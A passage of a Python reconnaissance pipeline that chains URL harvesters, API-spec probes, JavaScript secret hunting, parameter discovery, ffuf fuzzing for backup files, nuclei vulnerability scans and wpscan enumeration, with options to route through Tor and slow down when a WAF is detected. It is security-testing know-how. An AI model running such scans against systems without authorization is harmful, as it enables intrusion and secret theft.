        # the URL token from each line into a flat urls_gospider.txt.
        # Over Tor (proxychains) or WAF, reduce concurrency and depth to avoid hanging.
        _gs_threads = 1 if (_USE_PROXYCHAINS or waf_detected) else 3
        _gs_depth = 1 if (_USE_PROXYCHAINS or waf_detected) else 3
        runner = outdir / "logs" / "gospider_runner.sh"
        ensure(runner)
        runner.write_text(
            "#!/usr/bin/env bash\n"
            "set -eu\n"
            f"OUT={shlex.quote(str(outdir / 'urls_gospider.txt'))}\n"
            f"IN={shlex.quote(str(hosts))}\n"
            f'gospider -q -t {_gs_threads} -d {_gs_depth} -S "$IN" 2>/dev/null '
            '| grep -oE \'https?://[^[:space:]"]+\' | sort -u > "$OUT" || true\n'
        )
        runner.chmod(0o755)
        g1.append(("gospider", ["bash", str(runner)], _maybe_timeout(1800)))
    g2: List[Tuple[str, List[str], int]] = []
    if t.has("katana"):
        _katana_proxy = []
        if _PIPELINE_CFG.proxy:
            _katana_proxy = ["-proxy", _PIPELINE_CFG.proxy]
        _katana_depth = "1" if waf_detected else "3"
        g2.append(
            (
                "katana",
                [
                    "katana",
                    "-silent",
                    "-list",
                    str(hosts),
                    "-o",
                    str(outdir / "urls_katana.txt"),
                    "-jc",
                    "-d",
                    _katana_depth,
                    "-duc",
                ] + _katana_proxy + _extra_http_args(),
                _maybe_timeout(900) if waf_detected else _maybe_timeout(1800),
            )
        )
    if t.has("subjs"):
        runner = outdir / "logs" / "subjs_runner.sh"
        ensure(runner)
        runner.write_text(
            "#!/usr/bin/env bash\n"
            "set -eu\n"
            f"OUT={shlex.quote(str(outdir / 'urls_subjs.txt'))}\n"
            f"IN={shlex.quote(str(hosts))}\n"
            ': > "$OUT"\n'
            'subjs -i "$IN" > "$OUT" 2>/dev/null || true\n'
        )
        runner.chmod(0o755)
        g2.append(("subjs", ["bash", str(runner)], _maybe_timeout(1200)))
    # waymore — modern URL harvester combining gau/wayback/crtsh with caching
    if t.has("waymore"):
        g2.append(
            (
                "waymore",
                [
                    "waymore", "-i", str(hosts), "-mode", "U",
                    "-oU", str(outdir / "urls_waymore.txt"),
                    "-oR", str(outdir / "logs" / "waymore"),
                ],
                _maybe_timeout(1800),
            )
        )
    all_g = g1 + g2
    if all_g:
        await run_parallel(all_g, outdir)
    harvested = [
        outdir / "urls_gau.txt",
        outdir / "urls_gospider.txt",
        outdir / "urls_katana.txt",
        outdir / "urls_subjs.txt",
        outdir / "urls_waymore.txt",
    ]
    if not any(p.exists() and read_lines(p) for p in harvested):
        log("warn", "05-HARVEST: no URL harvesters produced output")
    n = merge_unique(harvested, outdir / "urls_all.txt")
    log("ok", f"05-HARVEST: {n} unique URLs")
    return {"05-HARVEST": str(outdir / "urls_all.txt"), "count": n}


async def phase_05b_APISPEC(
    outdir: Path, t: Tools, only: PhaseSet, skip: PhaseSet, prev: Dict[str, Any], force: bool = False,
) -> Dict[str, Any]:
    if skip & {"05b-APISPEC"}:
        return {}
    _out = outdir / "api_specs.txt"
    if _out.exists() and not force:
        return {"05b-APISPEC": str(_out), "count": count_nonblank(_out)}
    log("info", "Phase 05b-APISPEC: hunt API spec files (swagger, openapi, graphql SDL)")
    findings: List[str] = []
    _ap_urlopen = _get_urlopener()
    _ap_extra_headers = _extra_headers_dict()
    # Collect unique hosts from HARVEST output
    hosts_file = outdir / "hosts.txt"
    urls_file = outdir / "urls_all.txt"
    hosts: Set[str] = set()
    if hosts_file.exists():
        for h in read_lines(hosts_file):
            h = h.strip().rstrip("/")
            if h:
                hosts.add(h)
    if urls_file.exists():
        for u in read_lines(urls_file):
            u = u.strip().rstrip("/")
            if u:
                parsed = urllib.parse.urlparse(u)
                netloc = parsed.netloc or parsed.path.split("/")[0]
                if netloc:
                    hosts.add(f"{parsed.scheme}://{netloc}" if parsed.scheme else f"http://{netloc}")
    if not hosts:
        log("warn", "05b-APISPEC: no hosts found; skipping")
        return {"05b-APISPEC": str(_out), "count": 0}
    findings.append(f"target_hosts={len(hosts)}")
    api_paths = [
        "/swagger.json", "/swagger/v1/swagger.json", "/swagger/v2/swagger.json",
        "/api/swagger.json", "/api/v1/swagger.json", "/api/v2/swagger.json",
        "/openapi.json", "/openapi.yaml", "/openapi.yml",
        "/api/openapi.json", "/api/openapi.yaml",
        "/api-docs", "/api/v1/api-docs", "/api/v2/api-docs",
        "/v1/api-docs", "/v2/api-docs",
        "/graphql", "/graphql?sdl", "/v1/graphql", "/v2/graphql",
        "/graph/schema.graphql", "/graphql/schema.json",
        "/.well-known/openid-configuration",
    ]
    async def _probe_api_spec(host: str) -> List[str]:
        results: List[str] = []
        base = host.rstrip("/")
        if not base.startswith("http"):
            base = f"https://{base}"
        for path in api_paths:
            await _throttle_rate()
            url = f"{base}{path}"
            try:
                req = urllib.request.Request(url, headers={"User-Agent": "Mozilla/5.0", **_ap_extra_headers})
                status, headers, body_bytes = await _async_urlopen(_ap_urlopen, req, timeout=10)
                body = body_bytes.decode("utf-8", errors="ignore")
                if status in (200, 301, 302) and len(body) > 50:
                    content_type = headers.get("Content-Type", "")
                    # Validate it looks like an API spec
                    spec_type = "unknown"
                    if "swagger" in body.lower() or path.endswith("swagger.json"):
                        spec_type = "swagger"
                        # Extract endpoints
                        try:
                            data = json.loads(body)
                            if "paths" in data:
                                endpoints = list(data["paths"].keys())
                                results.append(f"[swagger] {url} → {len(endpoints)} endpoints")
                                for ep in endpoints[:20]:
                                    results.append(f"  {ep}")
                        except json.JSONDecodeError:
                            results.append(f"[swagger] {url} (unparseable JSON)")
                    elif "openapi" in body.lower() or path.endswith(("openapi.yaml", "openapi.yml", "openapi.json")):
                        spec_type = "openapi"
                        try:
                            data = json.loads(body)
                            if "paths" in data:
                                endpoints = list(data["paths"].keys())
                                results.append(f"[openapi] {url} → {len(endpoints)} endpoints")
                                for ep in endpoints[:20]:
                                    results.append(f"  {ep}")
                        except json.JSONDecodeError:
                            results.append(f"[openapi] {url} (unparseable JSON)")
                    elif "graphql" in body.lower() or "sdl" in path:
                        spec_type = "graphql-sdl"
                        results.append(f"[graphql-sdl] {url} → {len(body[:500].splitlines())} lines")
                        for ln in body[:1000].splitlines()[:10]:
                            results.append(f"  {ln[:120]}")
                    elif "id_token" in body or "jwks_uri" in body or "authorization_endpoint" in body:
                        spec_type = "oidc"
                        results.append(f"[oidc] {url} (OpenID Connect configuration)")
                    else:
                        results.append(f"[api-spec] {url} → HTTP {status} ({len(body)} bytes)")
            except Exception:
                continue
        return results
    host_list = sorted(hosts)[:_PIPELINE_CFG.sample_urls_apisec]
    probe_results = await asyncio.gather(*[_probe_api_spec(h) for h in host_list])
    for pr in probe_results:
        findings.extend(pr)
    if not findings or len(findings) == 1:
        findings.append("[result] No API spec files discovered")
    out = ensure(_out)
    out.write_text("\n".join(findings) + ("\n" if findings else ""))
    log("ok", f"05b-APISPEC: {len(findings)} findings → {out}")
    return {"05b-APISPEC": str(_out), "count": len(findings)}


async def phase_06_JSINTEL(outdir: Path, t: Tools, only: PhaseSet, skip: PhaseSet, force: bool = False) -> Dict[str, Any]:
    if skip & {"06-JSINTEL"}:
        return {}
    _c2_out = outdir / "js_secrets.txt"
    if _c2_out.exists() and not force:
        return {"06-JSINTEL": str(_c2_out), "count": count_nonblank(_c2_out)}
    log("info", "Phase 06-JSINTEL: JS analysis (SecretFinder + nuclei)")
    urls = outdir / "urls_all.txt"
    js_urls = outdir / "urls_js.txt"
    map_urls = outdir / "urls_sourcemap.txt"
    # Collect JS URLs and source-map URLs from the harvested pool.
    # Strip query/fragment to check extension; keep the full original URL.
    if urls.exists():
        keep_js: List[str] = []
        keep_map: List[str] = []
        seen_js: Set[str] = set()
        for u in read_lines(urls):
            path = u.split("?", 1)[0].split("#", 1)[0].lower()
            if path.endswith((".js", ".jsx", ".mjs", ".cjs", ".ts", ".tsx")):
                if u not in seen_js:
                    seen_js.add(u)
                    keep_js.append(u)
            if path.endswith(".map"):
                keep_map.append(u)
        if keep_js:
            ensure(js_urls).write_text("\n".join(keep_js) + "\n")
            log("ok", f"06-JSINTEL: collected {len(keep_js)} JS/TS URLs")
        if keep_map:
            ensure(map_urls).write_text("\n".join(keep_map) + "\n")
            log("ok", f"06-JSINTEL: collected {len(keep_map)} source-map URLs")
    if not js_urls.exists() or not read_lines(js_urls):
        log("info", "06-JSINTEL: no JS URLs found; skipping")
        ensure(outdir / "js_secrets.txt").write_text("")
        return {"06-JSINTEL": str(outdir / "js_secrets.txt"), "count": 0}
    # When running over proxychains/Tor, downsample JS URLs so
    # linkfinder/xnlinkfinder don't time out (each URL fetch is slow).
    _js_input = js_urls
    if _USE_PROXYCHAINS:
        js_lines = read_lines(js_urls)
        if len(js_lines) > 100:
            sampled = js_lines[:100]
            _js_input = outdir / "urls_js_sample.txt"
            ensure(_js_input).write_text("\n".join(sampled) + "\n")
            log("info", f"06-JSINTEL: downsampled {len(js_lines)} JS URLs to {len(sampled)} for slow network")

    jobs: List[Tuple[str, List[str], int]] = []
    if t.has("secretfinder"):
        # SecretFinder's -i flag expects a single URL, not a file.
        # Iterate over each JS URL so individual requests are not
        # misinterpreted as file-path HTTP fetches.
        runner = outdir / "logs" / "secretfinder_runner.sh"
        ensure(runner)
        runner.write_text(
            "#!/usr/bin/env bash\n"
            "set -u\n"
            f"OUT={shlex.quote(str(outdir / 'secrets.txt'))}\n"
            f"IN={shlex.quote(str(_js_input))}\n"
            ': > "$OUT"\n'
            'xargs -r -P 5 -I{} sh -c '
            '\'echo "[06-JSINTEL] secretfinder $1" >&2; '
            'timeout 120 secretfinder -i "$1" 2>/dev/null\' _ {} >> "$OUT" < "$IN" || true\n'
        )
        runner.chmod(0o755)
        jobs.append(("secretfinder", ["bash", str(runner)], _maybe_timeout(3600)))
    if t.has("linkfinder"):
        # linkfinder -o produces HTML output; kept for manual inspection only.
        # Use temp files per URL to avoid output interleaving from parallel runs.
        linkfinder_out = outdir / "urls_linkfinder.html"
        runner = outdir / "logs" / "linkfinder_runner.sh"
        ensure(runner)
        runner.write_text(
            "#!/usr/bin/env bash\n"
            "set -u\n"
            f"OUT={shlex.quote(str(linkfinder_out))}\n"
            f"IN={shlex.quote(str(_js_input))}\n"
            ': > "$OUT"\n'
            'TMPDIR=$(mktemp -d) || exit 1\n'
            'trap "rm -rf \'$TMPDIR\'" EXIT\n'
            'xargs -r -P 5 -I{} sh -c '
            '\'timeout 180 linkfinder -i "$1" > "$TMPDIR/$(echo "$1" | md5sum | cut -d" " -f1).html" 2>/dev/null\' _ {} < "$IN" || true\n'
            'cat "$TMPDIR"/*.html >> "$OUT" 2>/dev/null || true\n'
        )
        runner.chmod(0o755)
        jobs.append(("linkfinder", ["bash", str(runner)], _maybe_timeout(3600)))
    # Detect the actual xnLinkFinder binary name (case-sensitive on Linux)
    _xnlf_bin = ""
    if t.has("xnlinkfinder"):
        _xnlf_bin = "xnlinkfinder"
    elif t.has("xnLinkFinder"):
        _xnlf_bin = "xnLinkFinder"
    if _xnlf_bin:
        xnlink_out = outdir / "urls_xnlinkfinder.txt"
        runner = outdir / "logs" / "xnlinkfinder_runner.sh"
        ensure(runner)
        runner.write_text(
            "#!/usr/bin/env bash\n"
            "set -eu\n"
            f"IN={shlex.quote(str(_js_input))}\n"
            f"OUT={shlex.quote(str(xnlink_out))}\n"
            f'{_xnlf_bin} -i "$IN" -o "$OUT" -sp /tmp/xnlinkfinder 2>/dev/null || true\n'
        )
        runner.chmod(0o755)
        jobs.append((_xnlf_bin, ["bash", str(runner)], _maybe_timeout(1200)))
    if t.has("nuclei"):
        _nuc_proxy = []
        if _PIPELINE_CFG.proxy:
            _nuc_proxy = ["-proxy", _PIPELINE_CFG.proxy]
        jobs.append(
            (
                "nuclei-exposures",
                [
                    "nuclei",
                    "-silent",
                    "-l",
                    str(_js_input),
                    "-t",
                    "http/exposed-panels",
                    "-t",
                    "http/exposures",
                    "-o",
                    str(outdir / "nuclei_exposures.txt"),
                ] + _extra_http_args() + _nuc_proxy,
                _maybe_timeout(min(3000, 7200)),
            )
        )
    await run_parallel(jobs, outdir)
    # Merge endpoints discovered by JS tools back into urls_all.txt so
    # downstream phases (params, fuzz, authz) can discover fresh API surface.
    # xnLinkFinder often discovers URLs embedded in JS (API routes, endpoints).
    xnlink_out = outdir / "urls_xnlinkfinder.txt"
    if xnlink_out.exists() and read_lines(xnlink_out):
        merge_unique(
            [xnlink_out],
            outdir / "urls_all.txt",
        )
    # Collect .json endpoints from JS tool outputs and the full URL pool
    json_urls = outdir / "urls_json.txt"
    json_keep: List[str] = []
    json_seen: Set[str] = set()
    for src in [xnlink_out, outdir / "secrets.txt"]:
        if src and src.exists():
            for u in read_lines(src):
                path = u.split("?", 1)[0].split("#", 1)[0].lower()
                if path.endswith(".json") and u not in json_seen:
                    json_seen.add(u)
                    json_keep.append(u)
    if urls.exists():
        for u in read_lines(urls):
            path = u.split("?", 1)[0].split("#", 1)[0].lower()
            if path.endswith(".json") and u not in json_seen:
                json_seen.add(u)
                json_keep.append(u)
    if json_keep:
        ensure(json_urls).write_text("\n".join(json_keep) + "\n")
        log("ok", f"06-JSINTEL: collected {len(json_keep)} JSON API endpoints")
    # Merge JSON endpoints back so downstream phases see API surface
    if json_urls.exists() and read_lines(json_urls):
        merge_unique(
            [json_urls],
            outdir / "urls_all.txt",
        )
    n = merge_unique(
        [outdir / "secrets.txt", outdir / "nuclei_exposures.txt"],
        outdir / "js_secrets.txt",
    )
    if n == 0:
        log("warn", "06-JSINTEL: no JS findings produced")
        ensure(outdir / "js_secrets.txt").write_text("")
    return {"06-JSINTEL": str(outdir / "js_secrets.txt"), "count": n}


async def phase_07_PARAMS(
    outdir: Path, t: Tools, only: PhaseSet, skip: PhaseSet, prev: Dict[str, Any], force: bool = False,
) -> Dict[str, Any]:
    if skip & {"07-PARAMS"}:
        return {}
    _d_out = outdir / "params.txt"
    if _d_out.exists() and not force:
        return {"07-PARAMS": str(_d_out), "count": count_nonblank(_d_out)}
    log("info", "Phase 07-PARAMS: parameter discovery")
    # Clean up stale normalized output from prior runs so it doesn't
    # leak into the fresh merge on forced re-runs when arjun fails.
    for old in outdir.glob("params_*.txt"):
        if old.name != "params.txt":
            old.unlink(missing_ok=True)
    urls = outdir / "urls_all.txt"
    if not urls.exists() or not read_lines(urls):
        log("warn", "07-PARAMS: no URLs; skipping")
        return {"07-PARAMS": str(outdir / "params.txt"), "count": 0}
    _d_urls = _dedupe_by_host_path(read_lines(urls))
    jobs: List[Tuple[str, List[str], int]] = []
    # arjun writes JSON. We capture the JSON and normalize to one URL per
    # line in the .txt sibling below. Over Tor this is very slow — sample URLs.
    arjun_had_input = False
    if t.has("arjun"):
        arjun_in = ensure(outdir / "urls_arjun_sample.txt")
        waf_detected = _PIPELINE_CFG.waf_detected
        sample_size = min(_PIPELINE_CFG.sample_urls_params, _PIPELINE_CFG.sample_urls_arjun_waf) if waf_detected else _PIPELINE_CFG.sample_urls_params
        arjun_urls = _d_urls[:sample_size]
        if arjun_urls:
            arjun_had_input = True
            arjun_in.write_text("\n".join(arjun_urls) + "\n")
            runner = outdir / "logs" / "arjun_runner.sh"
            ensure(runner)
            runner.write_text(
                "#!/usr/bin/env bash\n"
                "set -eu\n"
                f"IN={shlex.quote(str(arjun_in))}\n"
                f"OUT={shlex.quote(str(outdir / 'params_arjun.json'))}\n"
                'arjun -i "$IN" -o "$OUT" 2>/dev/null || true\n'
            )
            runner.chmod(0o755)
            timeout = _maybe_timeout(600) if waf_detected else _maybe_timeout(1800)
            jobs.append(("arjun", ["bash", str(runner)], timeout))
            if waf_detected:
                log("info", f"07-PARAMS: WAF detected, reduced arjun sample to {sample_size} URLs with {timeout}s timeout")
    await run_parallel(jobs, outdir)
    # Normalize arjun JSON output to plain URL-per-line text.
    raw = outdir / "params_arjun.json"
    if raw.exists():
        norm = raw.with_suffix(".txt")
        urls_found: List[str] = []
        data = None
        try:
            data = json.loads(raw.read_text(encoding="utf-8", errors="ignore"))
        except json.JSONDecodeError:
            data = None
        # arjun output: { "https://url?q=1": {"parameters": [...]} }
        # or list of objects
        if isinstance(data, dict):
            for k, v in data.items():
                if isinstance(k, str) and (k.startswith("http://") or k.startswith("https://")):
                    urls_found.append(k)
        elif isinstance(data, list):
            for item in data:
                if isinstance(item, dict) and isinstance(item.get("url"), str):
                    urls_found.append(item["url"])
        # JSONL fallback
        if not urls_found:
            for rec in read_jsonl(raw):
                if isinstance(rec, dict) and rec.get("url"):
                    urls_found.append(str(rec["url"]))
        if not urls_found:
            reason = "likely blocked by WAF" if _PIPELINE_CFG.waf_detected else "arjun produced no results"
            log("warn", f"07-PARAMS: {reason}")
        ensure(norm).write_text("\n".join(urls_found) + ("\n" if urls_found else ""))
    elif arjun_had_input:
        log("warn", "07-PARAMS: arjun produced no output file")
    # Glob params_*.txt but EXCLUDE the params.txt we are about to write.
    parts = sorted(p for p in outdir.glob("params_*.txt") if p.name != "params.txt")
    n = merge_unique(parts, outdir / "params.txt")
    return {"07-PARAMS": str(outdir / "params.txt"), "count": n}


async def phase_08_FUZZ(outdir: Path, t: Tools, only: PhaseSet, skip: PhaseSet, force: bool = False) -> Dict[str, Any]:
    if skip & {"08-FUZZ"}:
        return {}
    _f_out = outdir / "fuzz.txt"
    if _f_out.exists() and not force:
        return {"08-FUZZ": str(_f_out), "count": count_nonblank(_f_out)}
    log("info", "Phase 08-FUZZ: fuzzing")
    urls = outdir / "urls_all.txt"
    all_urls = read_lines(urls) if urls.exists() else []
    if not all_urls:
        log("warn", "08-FUZZ: no URLs; skipping")
        return {"08-FUZZ": str(outdir / "fuzz.txt"), "count": 0}
    # Dedupe by (host, path) so URLs differing only in query params
    # don't all get fuzzed independently — saves significant time.
    deduped = _dedupe_by_host_path(all_urls)
    sample = deduped[:_PIPELINE_CFG.sample_urls_fuzz]
    _proxy_opt = []
    if _PIPELINE_CFG.proxy:
        _proxy_opt = ["-x", _PIPELINE_CFG.proxy]
    # When operating over proxychains/tor, use smaller wordlists and
    # shorter timeouts — each request is ~1-5s vs ~50ms on a direct link.
    _is_slow_network = _USE_PROXYCHAINS
    _ffuf_timeout = 1200 if _is_slow_network else 3000
    _ffuf_ext_timeout = 600 if _is_slow_network else 600
    _seclists_base = Path(os.environ.get("SECLISTS", "/usr/share/seclists"))
    wordlist = os.environ.get(
        "FFUF_WORDLIST",
        (
            str(_seclists_base / "Discovery/Web-Content/common.txt")
            if _is_slow_network
            else str(_seclists_base / "Discovery/Web-Content/raft-medium-directories.txt")
        ),
    )
    if not Path(wordlist).exists():
        wordlist = ""
    jobs: List[Tuple[str, List[str], int]] = []
    if not wordlist or not Path(wordlist).exists():
        alt = sorted(_seclists_base.glob("Discovery/Web-Content/common.txt"))
        if not alt:
            alt = sorted(_seclists_base.glob("Discovery/Web-Content/*.txt"))
        if alt:
            wordlist = str(alt[0])
    if not wordlist or not Path(wordlist).exists():
        log("warn", f"08-FUZZ: no wordlist found (searched {_seclists_base}), ffuf disabled")
        wordlist = ""
    if t.has("ffuf") and wordlist:
        for u in sample:
            out_json = outdir / f"ffuf_{safe_suffix(u)}.json"
            jobs.append(
                (
                    f"ffuf-{_safe_name(u)}",
                    [
                        "ffuf",
                        "-s",
                        "-ac",
                        "-u",
                        u.rstrip("/") + "/FUZZ",
                        "-w",
                        wordlist,
                        "-mc",
                        "200,301,302,403",
                        "-o",
                        str(out_json),
                    ]
                    + _proxy_opt + _extra_http_args(),
                    _ffuf_timeout,
                )
            )
        # Extension fuzzing pass — find .php, .json, .bak, .old, .swp files
        # using a lightweight wordlist (common.txt) with the -e flag.
        ext_wordlist = os.environ.get(
            "FFUF_EXT_WORDLIST",
            "/usr/share/seclists/Discovery/Web-Content/common.txt",
        )
        if Path(ext_wordlist).exists():
            for u in sample:
                out_json = outdir / f"ffuf_ext_{safe_suffix(u)}.json"
                jobs.append(
                    (
                        f"ffuf-ext-{_safe_name(u)}",
                        [
                            "ffuf", "-s", "-ac",
                            "-u", u.rstrip("/") + "/FUZZ",
                            "-w", ext_wordlist,
                            "-e", ".php,.json,.bak,.old,.swp,.txt,.xml,.tar.gz,.zip",
                            "-mc", "200,301,302,403",
                            "-o", str(out_json),
                        ]
                        + _proxy_opt + _extra_http_args(),
                        _ffuf_ext_timeout,
                    )
                )

    # Clean up stale normalized .txt files from prior runs first
    for old in outdir.glob("ffuf_*.txt"):
        old.unlink(missing_ok=True)
    await run_parallel(jobs, outdir)
    normalized: List[Path] = []
    for ffp in outdir.glob("ffuf_*.json"):
        norm = ffp.with_suffix(".txt")
        ensure(norm).write_text("\n".join(_extract_urls_from_ffuf_json(ffp)) + "\n")
        normalized.append(norm)
    n = merge_unique(normalized, outdir / "fuzz.txt")
    for p in outdir.glob("ffuf_*.json"):
        p.unlink(missing_ok=True)
    if n == 0:
        log("warn", "08-FUZZ: fuzzers produced no hits")
    return {"08-FUZZ": str(outdir / "fuzz.txt"), "count": n}


async def _update_nuclei_templates(outdir: Path) -> None:
    """Update nuclei templates if nuclei is available (non-blocking, best-effort).
    Skips update if templates were updated less than 24 hours ago (cache stamp)."""
    if not shutil.which("nuclei"):
        return
    cache_stamp = outdir / ".nuclei_update_stamp"
    if cache_stamp.exists():
        try:
            age = time.time() - float(cache_stamp.read_text(encoding="utf-8", errors="ignore").strip())
            if age < 86400:
                return
        except (ValueError, OSError):
            pass
    log("info", "09-VULNSCAN: updating nuclei templates…")
    proc = await asyncio.create_subprocess_exec(
        "nuclei", "-update-templates", "-silent",
        stdin=asyncio.subprocess.DEVNULL,
        stdout=asyncio.subprocess.DEVNULL,
        stderr=asyncio.subprocess.DEVNULL,
    )
    try:
        await asyncio.wait_for(proc.wait(), timeout=120)
        cache_stamp.write_text(str(time.time()))
    except asyncio.TimeoutError:
        proc.kill()
        await proc.wait()


async def phase_09_VULNSCAN(outdir: Path, t: Tools, only: PhaseSet, skip: PhaseSet, force: bool = False) -> Dict[str, Any]:
    if skip & {"09-VULNSCAN"}:
        return {}
    _f1_out = outdir / "nuclei_combined.txt"
    if _f1_out.exists() and not force:
        return {"09-VULNSCAN": str(_f1_out), "count": count_nonblank(_f1_out)}
    log("info", "Phase 09-VULNSCAN: nuclei (full) + tech-scanner")
    await _update_nuclei_templates(outdir)
    hosts = outdir / "host_targets.txt"
    if not hosts.exists() or not read_lines(hosts):
        raw_hosts = outdir / "hosts.txt"
        if raw_hosts.exists() and read_lines(raw_hosts):
            _write_target_tokens(raw_hosts, hosts)
    if not hosts.exists() or not read_lines(hosts):
        hosts = outdir / "resolved.txt"
    if not hosts.exists() or not read_lines(hosts):
        log("warn", "09-VULNSCAN: no hosts; skipping")
        return {"09-VULNSCAN": str(outdir / "nuclei_combined.txt"), "count": 0}
    jobs: List[Tuple[str, List[str], int]] = []
    _proxy_opt = []
    if _PIPELINE_CFG.proxy:
        _proxy_opt = ["-proxy", _PIPELINE_CFG.proxy]
    if t.has("nuclei"):
        nuclei_base = [
            "nuclei", "-silent", "-l", str(hosts),
            "-H", "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        ] + _extra_http_args()
        if _PIPELINE_CFG.rate_limit:
            nuclei_base += ["-rl", str(_PIPELINE_CFG.rate_limit)]
        # Bulk-size: process multiple templates per host for faster scans
        nuclei_base += ["-bs", "25"]
        # Tags: prefer cves, exposures for high-signal findings; exclude
        # info-severity templates that add noise on large targets.
        nuclei_tags = ["cves", "exposures", "misconfig", "vulnerabilities"]
        if _PIPELINE_CFG.nuclei_exclude_tags:
            nuclei_base += ["-et", _PIPELINE_CFG.nuclei_exclude_tags]
        jobs.append(
            (
                "nuclei-cves",
                nuclei_base
                + ["-tags", ",".join(nuclei_tags), "-severity", "low,medium,high,critical",
                   "-o", str(outdir / "nuclei.txt")]
                + _proxy_opt,
                3600,
            )
        )
        # Headless scan for DOM-based / client-side issues (needs nuclei with
        # headless engine — silently skipped if unsupported).
        jobs.append(
            (
                "nuclei-headless",
                nuclei_base
                + ["-headless", "-tags", "headless", "-severity", "medium,high,critical",
                   "-o", str(outdir / "nuclei_headless.txt")]
                + _proxy_opt,
                3600,
            )
        )
        # tech-scanner uses the same nuclei binary; do not double-gate on httpx.
        jobs.append(
            (
                "tech-scanner",
                nuclei_base
                + ["-t", "http/technologies",
                   "-o", str(outdir / "tech.txt")]
                + _proxy_opt,
                3600,
            )
        )
    await run_parallel(jobs, outdir)
    n = merge_unique(
        [outdir / "nuclei.txt", outdir / "nuclei_headless.txt", outdir / "tech.txt"],
        outdir / "nuclei_combined.txt",
    )
    return {"09-VULNSCAN": str(outdir / "nuclei_combined.txt"), "count": n}


async def phase_10_TLSCMS(outdir: Path, t: Tools, only: PhaseSet, skip: PhaseSet, force: bool = False) -> Dict[str, Any]:
    if skip & {"10-TLSCMS"}:
        return {}
    _f2_out = outdir / "tls_wp.txt"
    if _f2_out.exists() and not force:
        return {"10-TLSCMS": str(_f2_out), "count": count_nonblank(_f2_out)}
    log("info", "Phase 10-TLSCMS: testssl + wpscan")
    hosts = outdir / "host_targets.txt"
    if not hosts.exists() or not read_lines(hosts):
        raw_hosts = outdir / "hosts.txt"
        if raw_hosts.exists() and read_lines(raw_hosts):
            _write_target_tokens(raw_hosts, hosts)
    if not hosts.exists() or not read_lines(hosts):
        hosts = outdir / "resolved.txt"
    if not hosts.exists() or not read_lines(hosts):
        log("warn", "10-TLSCMS: no hosts; skipping")
        return {"10-TLSCMS": str(outdir / "tls_wp.txt"), "count": 0}
    sample = read_lines(hosts)[:_PIPELINE_CFG.sample_hosts_ssl]
    testssl_bin = "testssl.sh" if t.has("testssl.sh") else ("testssl" if t.has("testssl") else None)
    # testssl: write PER-HOST files via a runner (no shared `>>` file ⇒ no race).
    # The Python TLS fallback below works correctly over proxychains (Python's
    # socket module is hooked by LD_PRELOAD) unlike testssl.sh's /dev/tcp.
    testssl_jobs: List[Tuple[str, List[str], int]] = []
    if testssl_bin:
        for h in sample:
            per_host = outdir / f"testssl_{safe_suffix(h)}.txt"
            runner = outdir / "logs" / f"testssl_{safe_suffix(h)}.sh"
            ensure(runner)
            runner.write_text(
                "#!/usr/bin/env bash\n"
                "set -eu\n"
                f"OUT={shlex.quote(str(per_host))}\n"
                f"H={shlex.quote(h)}\n"
                f"BIN={shlex.quote(testssl_bin)}\n"
                '"$BIN" --quiet --color 0 "$H" > "$OUT" 2>&1 || true\n'
            )
            runner.chmod(0o755)
            testssl_jobs.append((f"testssl-{_safe_name(h)}", ["bash", str(runner)], 3600))
    # Python TLS fallback (works with proxychains, unlike testssl.sh's /dev/tcp)
    tls_script = outdir / "tls_check.py"
    tls_script.write_text(
        "#!/usr/bin/env python3\n"
        '"""Minimal TLS check that works through proxychains."""\n'
        "import json, ssl, socket, sys, urllib.parse\n"
        "from pathlib import Path\n"
        "HOSTS = " + json.dumps(sample) + "\n"
        "OUTDIR = " + json.dumps(str(outdir)) + "\n"
        'for h in HOSTS:\n'
        '    if h.startswith(("http://", "https://")):\n'
        '        parsed = urllib.parse.urlparse(h)\n'
        '        host = parsed.hostname\n'
        '        port = parsed.port or 443\n'
        '    else:\n'
        '        host = h.split(":")[0]\n'
        '        port = int(h.split(":")[1]) if ":" in h and h.split(":")[1].isdigit() else 443\n'
        '    safe = host.replace(".", "_").replace(":", "_")\n'
        '    out = Path(OUTDIR) / f"testssl_py_{safe}.txt"\n'
        '    try:\n'
        '        ctx = ssl.create_default_context()\n'
        '        ctx.check_hostname = True\n'
        '        ctx.verify_mode = ssl.CERT_REQUIRED\n'
        '        with socket.create_connection((host, port), timeout=15) as sock:\n'
        '            with ctx.wrap_socket(sock, server_hostname=host) as ssock:\n'
        '                ver = ssock.version()\n'
        '                cipher = ssock.cipher()\n'
        '                cert = ssock.getpeercert()\n'
        '                cn = next((v for part in cert.get("subject", []) for k, v in part if k == "commonName"), "")\n'
        '                san = [v for _, v in cert.get("subjectAltName", [])]\n'
        '                out.write_text(f"{h} | TLS {ver} | cipher={cipher[0]} | CN={cn} | SAN={san}\\n")\n'
        '    except Exception as e:\n'
        '        out.write_text(f"{h} | ERROR: {e}\\n")\n'
    )
    tls_script.chmod(0o755)
    testssl_jobs.append(("tls-check", ["python3", str(tls_script)], 300))
    # wpscan writes per-host files natively via --output.
    # Skip if the host doesn't appear to be WordPress (check multiple indicators).
    _f2_urlopen = _get_urlopener()
    wpscan_jobs: List[Tuple[str, List[str], int]] = []
    if t.has("wpscan"):
        for h in sample:
            if not h.startswith(("http://", "https://")):
                continue
            # Quick pre-check: is this WordPress? Check multiple paths + homepage body
            # to reduce false negatives from hardened / hidden wp-login.php.
            wp_found = False
            for wp_path in ("/wp-login.php", "/wp-content/", "/wp-includes/"):
                try:
                    req = urllib.request.Request(h.rstrip("/") + wp_path, method="HEAD")
                    wp_status, _, _ = await _async_urlopen(_f2_urlopen, req, timeout=10)
                    if wp_status in (200, 301, 302, 403, 401):
                        wp_found = True
                        break
                except Exception:
                    continue
            if not wp_found:
                # Check homepage body for WordPress markers
                try:
                    req = urllib.request.Request(h, method="GET", headers={"User-Agent": "Mozilla/5.0"})
                    _, _, wp_body_bytes = await _async_urlopen(_f2_urlopen, req, timeout=10)
                    body = wp_body_bytes.decode("utf-8", errors="ignore").lower()
                    if "wp-content" in body or "wordpress" in body:
                        wp_found = True
                except Exception:
                    pass
            if not wp_found:
                continue
            wps_out = outdir / f"wpscan_{safe_suffix(h)}.txt"
            wpscan_cmd = ["wpscan", "--url", h, "--no-banner",
                           "--enumerate", "vp,vt,tt,cb,dbe,u,ap,at",
                           "--output", str(wps_out)]
            if _PIPELINE_CFG.proxy:
                wpscan_cmd.extend(["--proxy", _PIPELINE_CFG.proxy])
            _wps_cookie = os.environ.get("COOKIE", "")
            if _wps_cookie:
